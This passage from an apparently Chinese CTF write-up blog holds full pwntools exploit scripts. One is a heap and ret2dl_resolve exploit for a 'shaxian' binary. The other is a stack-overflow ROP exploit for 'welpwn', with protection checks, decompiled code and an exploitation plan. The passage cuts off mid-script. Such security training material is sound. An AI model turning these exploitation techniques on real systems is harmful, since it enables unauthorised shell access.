0x08048912,malloc后，查看分配的堆块的数据域地址</span></span><br><span class="line"><span class="string">bp 0x08048B8E,Diancai函数返回地址</span></span><br><span class="line"><span class="string">bp 0x080489F6,查看要Free的堆块地址</span></span><br><span class="line"><span class="string">bp 0x08048B95,Submit函数返回地址</span></span><br><span class="line"><span class="string">bp 0x08048737,atoi调用地址</span></span><br><span class="line"><span class="string">bp 0x08048C29,add_ppp_ebp_ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'180.76.178.48'</span>,<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="comment"># io = gdb.debug('./shaxian','''bp 0x08048B31</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048912</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048B8E</span></span><br><span class="line">            <span class="comment">#                               bp 0x080489F6</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048B95</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048C29''')</span></span><br><span class="line">            io = gdb.debug(<span class="string">'./shaxian'</span>,<span class="string">'''bp 0x08048C29'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./shaxian'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dian_cai</span><span class="params">(io,name,count)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'How many?\n'</span>)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receipt</span><span class="params">(io,taitou)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)   <span class="comment"># 程序中用的是puts()</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Taitou:'</span>)     <span class="comment"># 程序中用的是printf()</span></span><br><span class="line">    io.sendline(taitou)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">review</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x86</span></span><br><span class="line"><span class="comment"># Elf32_Rel *reloc = JMPREL + reloc_offset          # 符号的重定位项的地址</span></span><br><span class="line"><span class="comment"># Elf32_Sym *sym = &amp;SYMTAB[(reloc-&gt;r_info)&gt;&gt;8]      # 符号的符号项的地址</span></span><br><span class="line"><span class="comment"># i.e.*sym = DT_SYMTAB + [(reloc-&gt;r_info)&gt;&gt;8]*4*4 # Elf32_Sym结构体的大小为16字节</span></span><br><span class="line"><span class="comment"># assert(((reloc-&gt;r_info)&amp;0xff) == 0x07)            # 重定位类型是R_386_JMP_SLOT</span></span><br><span class="line"><span class="comment"># if((sym-&gt;st_other)&amp;3 == 0)                        # 符号可见性</span></span><br><span class="line"><span class="comment"># uint16_t ndx = VERSYM[(reloc-&gt;r_info)&gt;&gt;8]         # ndx=0 -&gt; local symbol</span></span><br><span class="line"><span class="comment"># i.e.  ndx = DT_VERSYM + [(reloc-&gt;r_info)&gt;&gt;8]*2    # 符号版本索引的大小为2字节</span></span><br><span class="line"><span class="comment"># r_found_version *version = &amp;l-&gt;l_version(ndx)     # 当前符号的版本信息</span></span><br><span class="line"><span class="comment"># i.e.  *version = &amp;l-&gt;l_version + ndx*4*4          # r_found_version结构体的大小为16字节</span></span><br><span class="line"><span class="comment"># name = DT_STRTAB + sym-&gt;st_name                   # 当前符号的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word r_info;   /* 重定位类型和符号表下标 */ 4byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_reloc_data</span><span class="params">(got_plt,sym_index)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(got_plt) + p32((sym_index&lt;&lt;<span class="number">8</span>) + <span class="number">0x07</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word    st_size;  /* 符号的大小 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf32_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x08048408</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x080481DC</span></span><br><span class="line">DT_STRTAB = <span class="number">0x080482EC</span></span><br><span class="line">DT_VERSYM = <span class="number">0x08048396</span></span><br><span class="line">PLT0 = <span class="number">0x08048490</span></span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x0804B038</span></span><br><span class="line">system_got = atoi_got</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0804B0C0 - 0x0804B1C0 (0x100)</span></span><br><span class="line">Phone_number_buf = <span class="number">0x0804B0C0</span></span><br><span class="line"><span class="comment"># 0x0804B1C0 - 0x0804B1E0 (0x20)</span></span><br><span class="line">head_ptr = <span class="number">0x0804B1C0</span></span><br><span class="line"><span class="comment"># 0x0804B1E0 - 0x0804B2E0 (0x100)</span></span><br><span class="line">Address_buf = <span class="number">0x0804B1E0</span></span><br><span class="line"><span class="comment"># 0x0804B2E0 - 0x0804B300 (0x20)</span></span><br><span class="line">shopping_cart = <span class="number">0x0804B2E0</span></span><br><span class="line"><span class="comment"># 0x0804B300 - 0x0804B400 (0x100)</span></span><br><span class="line">Title = <span class="number">0x0804B300</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[fake_chunk] for [fake_chain]</span></span><br><span class="line"><span class="string">0x0804BF08 - 0x0804BF10  chunk_header</span></span><br><span class="line"><span class="string">0x0804BF10 - 0x0804BF14  count</span></span><br><span class="line"><span class="string">0x0804BF14 - 0x0804BF34  food_type</span></span><br><span class="line"><span class="string">0x0804BF34 - 0x0804BF38  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[fake_chain]</span></span><br><span class="line"><span class="string">0x0804BF14 - 0x0804BF1C  reloc_data</span></span><br><span class="line"><span class="string">0x0804BF1C - 0x0804BF2C  sym_data</span></span><br><span class="line"><span class="string">0x0804BF2C - 0x0804BF34  "system"</span></span><br><span class="line"><span class="string">0x0804BF34 - 0x0804BF3C  "/bin/sh"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reloc_data_addr(0x0804BF14) = DT_JMPREL(0x08048408) + reloc_offset(0x3B0C)</span></span><br><span class="line">reloc_offset = <span class="number">0x3B0C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x0804BF1C) = DT_SYMTAB(0x080481DC) + sym_index(0x3D4) * 16   (not useful)</span></span><br><span class="line"><span class="comment"># versym_data_addr(0x08048B3E) = DT_VERSYM(0x08048396) + sym_index(0x3D4) * 2</span></span><br><span class="line"><span class="comment"># ndx = 0x0</span></span><br><span class="line">reloc_data_addr = <span class="number">0x0804BF14</span></span><br><span class="line">reloc_data = generate_x86_reloc_data(system_got,<span class="number">0x3D4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x0804BF2C) = DT_STRTAB(0x080482EC) + name_offset(0x3C40)</span></span><br><span class="line">sym_data_addr = <span class="number">0x0804BF1C</span></span><br><span class="line">sym_data = generate_x86_sym_data(<span class="number">0x3C40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x0804BF2C) = sym_data_addr + 0x10</span></span><br><span class="line">func_name_addr = sym_data_addr + <span class="number">0x10</span></span><br><span class="line">func_name = <span class="string">"system\x00\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x0804BF34) = func_name_addr + 0x8</span></span><br><span class="line">binsh_str_addr = func_name_addr + <span class="number">0x8</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    内存布局：</span></span><br><span class="line"><span class="string">    0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">    0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">    0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">    0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">    0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">    0x0804B1C4 - 0x0804B1DC------------</span></span><br><span class="line"><span class="string">    0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">    0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    phone_number = <span class="string">'A'</span>*<span class="number">240</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>)</span><br><span class="line">    address = p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">    io.sendline(address)</span><br><span class="line">    io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">    io.sendline(phone_number)</span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage1: Create fake_chunk for fake_chain'</span>)</span><br><span class="line">    <span class="comment"># 伪造fake_chunk的chunk_header</span></span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(<span class="number">0x0804BF10</span> - <span class="number">0x4</span>)</span><br><span class="line">    name = name.ljust(<span class="number">36</span>,<span class="string">'\x00'</span>) <span class="comment"># 修改fake_chunk的next指针,防止下一次Free堆块时进入死循环</span></span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(<span class="number">0x31</span>))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)<span class="comment"># 0x804b1b8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造fake_chunk相邻的next_chunk的chunk_header</span></span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(<span class="number">0x0804BF38</span> + <span class="number">0x4</span>)</span><br><span class="line">    name = name.ljust(<span class="number">36</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(<span class="number">0x31</span>))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)<span class="comment"># 0x804b1b8</span></span><br><span class="line">    </span><br><span class="line">    raw_input(<span class="string">'Stage2: Write fake_chain to fake_chunk.'</span>)</span><br><span class="line">    dian_cai(io,<span class="string">'C'</span>*<span class="number">32</span> + p32(reloc_data_addr - <span class="number">0x4</span>),<span class="number">2</span>)  <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)                                          <span class="comment"># 0x804c008,0x0804BF10</span></span><br><span class="line">    fake_chain = reloc_data</span><br><span class="line">    fake_chain += sym_data</span><br><span class="line">    fake_chain += func_name</span><br><span class="line">    fake_chain += binsh_str</span><br><span class="line">    dian_cai(io,fake_chain,<span class="number">3</span>) <span class="comment"># 0x0804BF10</span></span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage3: Write shellcode to Title.'</span>)</span><br><span class="line">    shellcode = p32(PLT0) + p32(reloc_offset) + p32(<span class="number">0x01010101</span>) + p32(binsh_str_addr)</span><br><span class="line">    payload = <span class="string">"BBBB"</span><span class="comment"># </span></span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.rjust(<span class="number">240</span>,<span class="string">'A'</span>)</span><br><span class="line">    receipt(io,payload)</span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage4: Modify atoi_got to gadgets.'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    08048C29  add esp, 1Ch</span></span><br><span class="line"><span class="string">    08048C2C  pop ebx</span></span><br><span class="line"><span class="string">    08048C2D  pop esi</span></span><br><span class="line"><span class="string">    08048C2E  pop edi</span></span><br><span class="line"><span class="string">    08048C2F  pop ebp</span></span><br><span class="line"><span class="string">    08048C30  retn</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    add_ppp_ebp_ret = <span class="number">0x08048C29</span></span><br><span class="line">    leave_ret = <span class="number">0x080485c8</span></span><br><span class="line">    </span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">    <span class="comment"># name = name.ljust(36,'\x00')</span></span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(add_ppp_ebp_ret))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)<span class="comment"># 0x804b1b8</span></span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage5: Jump to shellcode.'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"choose:\n"</span>)</span><br><span class="line">    <span class="comment"># esi,edi,ebp,ret(将ebp修改为shellcode地址,通过ebp和leave_ret调整esp)</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">8</span> + p32(Title + <span class="number">0x100</span> - <span class="number">0x10</span> - <span class="number">0x14</span>) + p32(leave_ret)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span><span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h2 id="welpwn-pwn200"><a href="#welpwn-pwn200" class="headerlink" title="welpwn-pwn200"></a>welpwn-pwn200</h2><h3 id="0x00-检查程序开启的保护机制-1"><a href="#0x00-检查程序开启的保护机制-1" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file welpwn        </span><br><span class="line">welpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec welpwn</span><br><span class="line">[*] &apos;/home//Desktop/remote-dbg/welpwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到这是一个<code>64位</code>的<code>ELF可执行程序</code>，开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>NX(DEP)</code>使堆栈上的代码不可执行。</p><h3 id="0x10-静态分析-1"><a href="#0x10-静态分析-1" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;通过IDA插件反编译后，<code>主函数</code>的伪代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> argv, <span class="keyword">const</span> <span class="keyword">char</span> envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">400</span>]; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">10u</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to RCTF\n"</span>, <span class="number">16u</span>LL);</span><br><span class="line">  fflush(_bss_start);                      <span class="comment">// 刷新bss段内容</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024u</span>LL);</span><br><span class="line">  echo(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到<code>主函数</code>在<code>栈</code>上有一个<code>1024字节</code>的大缓冲区buf，在从标准输入读取完数据后，将<code>buf缓冲区地址</code>作为参数，传入到了<code>echo()函数</code>。下面是echo()函数的伪代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buf[i]; ++i )</span><br><span class="line">    flag[i] = buf[i];     <span class="comment">// flag大小为16,存在栈溢出</span></span><br><span class="line">  flag[i] = <span class="number">0</span>;  <span class="comment">// 如果buf中的字符串长度为16,这里可以修改rbp最低字节</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, flag);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到<code>flag字符数组</code>只有<code>16字节</code>大小，如果传入的<code>buf字符串</code>的长度大于16字节，就会覆盖<code>echo()函数</code>的<code>rbp内容</code>(也就是main函数的rbp)，以及<code>echo()函数</code>的<code>返回地址</code>，从而获得程序的控制流。</p><h3 id="0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"><a href="#0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。" class="headerlink" title="0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"></a>0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。</h3><p><strong><code>利用思路</code></strong>：</p><p>1、首先构造<code>payload</code>，使echo()函数的rbp指向的内容的最低字节修改为<code>“\x00”</code>，也就是<code>main()函数</code>的<code>rbp</code>的<code>最低字节</code>。echo()函数正常返回到main()函数，但是main()函数的rbp得到修改，这样就会使<code>main()函数</code>返回时，<code>返回地址</code>落在了<code>buf缓冲区内</code>。我们通过将<code>ROP chain</code>喷射到<code>buf缓冲区内</code>，使main()函数返回时刚好可以<code>返回到ROP chain</code>。但这需要一定的几率，因为系统如果开启<code>ASLR</code>，每次执行程序时，<code>main()函数的rbp</code>都是不同的。</p><p>&emsp;&emsp;此<code>ROP chain</code>的功能是利用<code>puts()函数</code>泄露任一程序中使用到的<code>库函数地址</code>。然后，返回到<code>main()函数</code>起始地址，进行<code>下一次利用</code>。</p><p>2、根据泄露出的<code>库函数地址</code>，以及所给<code>libc.so</code>，我们可以计算出<code>libc.so的加载基址</code>。再加上system()函数的偏移或“/bin/sh\x00”字符串的偏移，就可以计算出<code>system()函数</code>的地址以及<code>“/bin/sh\x00”</code>字符串的地址。</p><p>3、再次构造<code>payload</code>，这次的<code>ROP chain</code>的功能是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_amd64</span></span><br><span class="line"><span class="comment"># 方法：栈喷射+覆盖main's rbp最低字节,转移main函数栈底位置。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23_x86_64.so'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'180.76.128.48'</span>,<span class="number">6666</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">'\x00'</span>*<span class="number">8</span> <span class="comment"># \x00截断</span></span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">    <span class="keyword">while</span> len(payload) &lt; <span class="number">1024</span> - len(rop):</span><br><span class="line">        payload += rop</span><br><span class="line">    payload = payload.ljust(<span class="number">1024</span>,<span class="string">'B'</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># printf("%s", flag);</span></span><br><span class="line">    data = io.recvuntil(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>) <span class="comment"># rop中调用puts函数打印puts函数地址</span></span><br><span class="line">    puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"puts_addr:"</span>,hex(puts_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> puts_addr&amp;<span class="number">0xfff</span> != <span class="number">0x6A0</span>: <span class="comment"># 系统ASLR开启,不能保证每次main函数的rbp都符合条件</span></span><br><span class="line">        exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">    libc_base = 